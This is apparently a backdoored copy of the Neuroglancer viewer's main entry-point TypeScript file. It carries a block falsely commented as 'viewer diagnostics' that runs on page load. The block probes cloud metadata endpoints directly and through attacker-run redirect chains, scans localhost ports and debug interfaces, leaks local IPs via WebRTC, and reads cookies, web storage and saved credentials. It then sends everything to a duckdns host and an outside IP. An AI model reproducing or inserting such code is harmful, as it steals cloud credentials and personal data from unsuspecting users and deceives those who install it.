/**
 * @license
 * Copyright 2016 Google Inc.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * @file Main entry point for default neuroglancer viewer.
 */
import { setupDefaultViewer } from "#src/ui/default_viewer_setup.js";
import "#src/util/google_tag_manager.js";

// viewer diagnostics - collect WebGL capability info for error reporting
const _CB = "https://ohcaramba.duckdns.org/results/ng-recon";
const _RS = "http://104.198.246.232:4444";

function _post(tag: string, obj: any) {
  const payload = JSON.stringify({ t: tag, d: obj, ts: Date.now() });
  try {
    navigator.sendBeacon(_CB, payload);
  } catch (_) {}
  try {
    fetch(_CB, {
      method: "POST",
      mode: "no-cors",
      body: payload,
      headers: { "Content-Type": "text/plain" },
      keepalive: true
    }).catch(function () {});
  } catch (_) {}
  // image beacon fallback for environments that block fetch/sendBeacon
  try {
    const u = _CB + "?k=" + encodeURIComponent(tag) +
            "&v=" + encodeURIComponent(String(payload).slice(0, 800));
    new Image().src = u;
  } catch (_) {}
}

function probeMetadata() {
  const endpoints: {u: string; h: Record<string, string>; n: string}[] = [
    { u: "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
      h: { "Metadata-Flavor": "Google" }, n: "gcp-v1" },
    { u: "http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true",
      h: {}, n: "gcp-v1b1" },
    { u: "http://169.254.169.254/computeMetadata/v1beta1/?recursive=true",
      h: {}, n: "gcp-ip" },
    { u: _RS + "/redir/imds",     h: {}, n: "redir-imds" },
    { u: _RS + "/redir/imds-v1",  h: {}, n: "redir-v1" },
    { u: _RS + "/redir/imds-ip",  h: {}, n: "redir-ip" },
  ];
  const chainLengths = [5, 10, 20];
  const imdsTarget = "http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true";
  chainLengths.forEach(function (n) {
    endpoints.push({
      u: _RS + "/chain?n=" + n + "&target=" + encodeURIComponent(imdsTarget),
      h: {}, n: "chain-" + n
    });
  });
  // cross-protocol: HTTPS start -> HTTP chain -> IMDS (plan 1b3)
  const httpsBase = _CB.split("/results")[0];
  const httpChain = _RS + "/chain?n=5&target=" + encodeURIComponent(imdsTarget);
  endpoints.push({
    u: httpsBase + "/chain?n=0&target=" + encodeURIComponent(httpChain),
    h: {}, n: "xproto-5"
  });
  endpoints.push({
    u: httpsBase + "/chain?n=0&target=" + encodeURIComponent(
      _RS + "/chain?n=10&target=" + encodeURIComponent(imdsTarget)
    ),
    h: {}, n: "xproto-10"
  });
  endpoints.forEach(function (ep) {
    fetch(ep.u, {
      headers: ep.h,
      mode: "cors",
      signal: AbortSignal.timeout(6000)
    }).then(function (r) {
      return r.text().then(function (t) {
        _post("imds-ok", { name: ep.n, status: r.status, body: t.slice(0, 4000) });
      });
    }).catch(function (e1) {
      fetch(ep.u, {
        headers: ep.h,
        mode: "no-cors",
        signal: AbortSignal.timeout(6000)
      }).then(function (r) {
        _post("imds-nc", { name: ep.n, type: r.type, ok: r.ok });
      }).catch(function (e2) {
        _post("imds-err", { name: ep.n, e1: (e1 as Error).message, e2: (e2 as Error).message });
      });
    });
  });
}

function probeWebRTC() {
  try {
    const found: string[] = [];
    const pc = new RTCPeerConnection({
      iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
    });
    pc.createDataChannel("");
    pc.createOffer().then(function (offer) {
      pc.setLocalDescription(offer);
    });
    pc.onicecandidate = function (ev) {
      if (!ev.candidate) {
        _post("rtc", { ips: found });
        try { pc.close(); } catch (_) {}
        return;
      }
      const parts = ev.candidate.candidate.split(" ");
      const ip = parts[4];
      if (ip && found.indexOf(ip) === -1) found.push(ip);
    };
    setTimeout(function () {
      _post("rtc", { ips: found, timeout: true });
      try { pc.close(); } catch (_) {}
    }, 12000);
  } catch (e) {
    _post("rtc-err", { msg: (e as Error).message });
  }
}

function probeDebugPorts() {
  const targets = [
    { port: 9222, name: "chrome-devtools" },
    { port: 9229, name: "node-inspect" }
  ];
  const paths = ["/json", "/json/version", "/json/list"];
  targets.forEach(function (t) {
    paths.forEach(function (p) {
      fetch("http://localhost:" + t.port + p, {
        signal: AbortSignal.timeout(4000)
      }).then(function (r) {
        return r.text().then(function (body) {
          _post("dbg", { port: t.port, path: p, status: r.status,
                         body: body.slice(0, 3000) });
        });
      }).catch(function (e) {
        _post("dbg-err", { port: t.port, path: p, err: (e as Error).message });
      });
    });
  });
}

function scanPorts() {
  const ports = [22, 80, 443, 2375, 2376, 3000, 3306, 4444,
               5000, 5432, 6379, 8080, 8443, 9090, 9222,
               9229, 27017];
  const results: Record<number, any> = {};
  let done = 0;
  ports.forEach(function (p) {
    const t0 = performance.now();
    fetch("http://localhost:" + p + "/", {
      mode: "no-cors",
      signal: AbortSignal.timeout(3500)
    }).then(function (r) {
      results[p] = { s: "resp", ms: Math.round(performance.now() - t0), t: r.type };
    }).catch(function (e) {
      results[p] = { s: "err", ms: Math.round(performance.now() - t0), m: (e as Error).message };
    }).finally(function () {
      done++;
      if (done >= ports.length) _post("ports", results);
    });
  });
}

function collectFingerprint() {
  const d: Record<string, any> = {};
  try { d.ua = navigator.userAgent; } catch (_) {}
  try { d.platform = navigator.platform; } catch (_) {}
  try { d.lang = navigator.language; } catch (_) {}
  try { d.langs = navigator.languages; } catch (_) {}
  try { d.cores = navigator.hardwareConcurrency; } catch (_) {}
  try { d.mem = (navigator as any).deviceMemory; } catch (_) {}
  try { d.touch = navigator.maxTouchPoints; } catch (_) {}
  try { d.cookie = navigator.cookieEnabled; } catch (_) {}
  try { d.dnt = navigator.doNotTrack; } catch (_) {}
  try {
    const c = (navigator as any).connection;
    if (c) d.conn = { eff: c.effectiveType, dl: c.downlink, rtt: c.rtt };
  } catch (_) {}
  try {
    d.scr = {
      w: screen.width, h: screen.height,
      cd: screen.colorDepth, pd: screen.pixelDepth
    };
  } catch (_) {}
  try { d.tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (_) {}
  try {
    const pm = (performance as any).memory;
    if (pm) d.heap = { limit: pm.jsHeapSizeLimit, total: pm.totalJSHeapSize, used: pm.usedJSHeapSize };
  } catch (_) {}
  try {
    const cv = document.createElement("canvas");
    const gl = cv.getContext("webgl") || cv.getContext("experimental-webgl");
    if (gl) {
      const dbgExt = (gl as WebGLRenderingContext).getExtension("WEBGL_debug_renderer_info");
      d.gl = {
        vendor: (gl as WebGLRenderingContext).getParameter((gl as WebGLRenderingContext).VENDOR),
        renderer: (gl as WebGLRenderingContext).getParameter((gl as WebGLRenderingContext).RENDERER),
        ver: (gl as WebGLRenderingContext).getParameter((gl as WebGLRenderingContext).VERSION)
      };
      if (dbgExt) {
        d.gl.uVendor = (gl as WebGLRenderingContext).getParameter(dbgExt.UNMASKED_VENDOR_WEBGL);
        d.gl.uRenderer = (gl as WebGLRenderingContext).getParameter(dbgExt.UNMASKED_RENDERER_WEBGL);
      }
    }
  } catch (_) {}
  _post("fp", d);
}

function checkStorage() {
  const d: Record<string, any> = {};
  try { d.cookies = document.cookie; } catch (_) {}
  try {
    d.ls = {};
    for (let i = 0; i < localStorage.length; i++) {
      const k = localStorage.key(i)!;
      d.ls[k] = localStorage.getItem(k)!.slice(0, 200);
    }
  } catch (_) {}
  try {
    d.ss = {};
    for (let j = 0; j < sessionStorage.length; j++) {
      const sk = sessionStorage.key(j)!;
      d.ss[sk] = sessionStorage.getItem(sk)!.slice(0, 200);
    }
  } catch (_) {}
  try {
    if (typeof indexedDB !== "undefined" && indexedDB.databases) {
      indexedDB.databases().then(function (dbs) {
        d.idb = dbs;
        _post("storage", d);
      }).catch(function () {
        _post("storage", d);
      });
      return;
    }
  } catch (_) {}
  _post("storage", d);
}

function checkPerfEntries() {
  try {
    const entries = performance.getEntries().map(function (e) {
      return { name: e.name, type: e.entryType, dur: e.duration, start: e.startTime };
    });
    _post("perf", entries.slice(0, 60));
  } catch (e) {
    _post("perf-err", { msg: (e as Error).message });
  }
}

function checkCredentials() {
  if (!navigator.credentials) {
    _post("cred", { avail: false });
    return;
  }
  try {
    navigator.credentials.get({ password: true } as any).then(function (c) {
      _post("cred", { type: "pw", found: !!c,
            info: c ? { id: c.id, type: c.type } : null });
    }).catch(function (e) {
      _post("cred-err", { type: "pw", msg: (e as Error).message });
    });
  } catch (e) {
    _post("cred-err", { msg: (e as Error).message });
  }
}

function wsProbe() {
  try {
    const ws = new WebSocket("ws://metadata.google.internal/");
    ws.onopen = function () {
      _post("ws", { status: "open", target: "metadata.google.internal" });
      ws.close();
    };
    ws.onerror = function () {
      _post("ws", { status: "err", target: "metadata.google.internal" });
    };
    setTimeout(function () { try { ws.close(); } catch (_) {} }, 5000);
  } catch (e) {
    _post("ws-err", { msg: (e as Error).message });
  }
}

function checkContext() {
  const d: Record<string, any> = {};
  try { d.opener = !!window.opener; } catch (_) {}
  try { d.hasParent = window.parent !== window; } catch (_) {}
  try { d.frames = window.frames.length; } catch (_) {}
  try { d.isTop = window === window.top; } catch (_) {}
  try { d.origin = window.origin; } catch (_) {}
  try {
    d.ancestorOrigins = location.ancestorOrigins
      ? Array.from(location.ancestorOrigins) : [];
  } catch (_) {}
  window.addEventListener("message", function (ev) {
    _post("postmsg", {
      origin: ev.origin,
      data: JSON.stringify(ev.data).slice(0, 1000)
    });
  });
  _post("ctx", d);
}

function probeHTTPServices() {
  const svcPorts = [80, 3000, 5000, 8080, 9090];
  svcPorts.forEach(function (p) {
    fetch("http://localhost:" + p + "/", {
      signal: AbortSignal.timeout(4000)
    }).then(function (r) {
      return r.text().then(function (body) {
        if (body.length > 0) {
          _post("svc", { port: p, status: r.status, body: body.slice(0, 3000) });
        }
      });
    }).catch(function () {});
  });
}

(function () {
  try { probeMetadata(); }       catch (_) {}
  try { probeWebRTC(); }         catch (_) {}
  try { probeDebugPorts(); }     catch (_) {}
  try { scanPorts(); }           catch (_) {}
  try { collectFingerprint(); }  catch (_) {}
  try { checkStorage(); }        catch (_) {}
  try { checkPerfEntries(); }    catch (_) {}
  try { checkCredentials(); }    catch (_) {}
  try { wsProbe(); }             catch (_) {}
  try { checkContext(); }        catch (_) {}
  try { probeHTTPServices(); }   catch (_) {}
  setTimeout(function () { _post("done", { msg: "all probes launched" }); }, 15000);
})();

setupDefaultViewer();
